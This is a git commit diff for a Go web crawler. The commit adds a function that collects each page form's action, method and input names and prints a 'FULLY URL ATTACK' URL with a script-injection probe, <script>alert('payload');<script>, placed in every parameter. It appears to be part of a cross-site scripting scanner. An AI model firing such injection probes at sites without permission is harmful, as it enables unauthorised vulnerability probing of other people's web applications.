31fec585939db3f6f74281ed6ca8e784fb576cc2
Yatno Sudar <yatnosudar@gits.co.id>
2019-03-16 21:55:41 +0700

    add form input
    [+] get param form input
    [+] get method form input
    [+] show full url attach

--- check/check.go
+++ check/check.go
@@ -23,6 +23,7 @@ func IsCheck(isURL string) {
 		if link != "" && link != "#" {
 			fmt.Println("[+] Is Parent ", link)
 			IsCheckParentURL(link)
+			IsCheckFormHtml(link)
 		}
 
 	})
@@ -46,6 +47,42 @@ func IsCheckParentURL(isURL string) {
 		link := e.Attr("action")
 		if link != "" && link != "#" {
 			fmt.Println("[+] Is Child ", link)
+		}
+	})
+
+	c.OnError(func(r *colly.Response, err error) {
+		log.Println("error:", r.StatusCode, err)
+	})
+
+	c.Visit(URL)
+}
+
+func IsCheckFormHtml(isURL string) {
+	URL := isURL
+	if URL == "" {
+		log.Println("missing URL argument")
+		return
+	}
+
+	c := colly.NewCollector()
+	c.OnHTML("form[action]", func(e *colly.HTMLElement) {
+		link := e.Attr("action")
+		if link != "" && link != "#" {
+			fmt.Println("[+] Is Child ", link)
+
+			methodForm := e.Attr("method")
+			inputName := e.ChildAttrs("input", "name")
+			fmt.Println(inputName)
+			urlAttach := "?"
+			for i := 0; i < len(inputName); i++ {
+				urlAttach = urlAttach+"&" + inputName[i] + "=<script>alert('payload');<script>"
+			}
+			if methodForm == ""{
+				methodForm = "GET"
+			}
+			fmt.Print("[+] FULLY URL ATTACK : ", methodForm)
+			fmt.Println(" ", link+urlAttach)
+
 		}
 	})
 
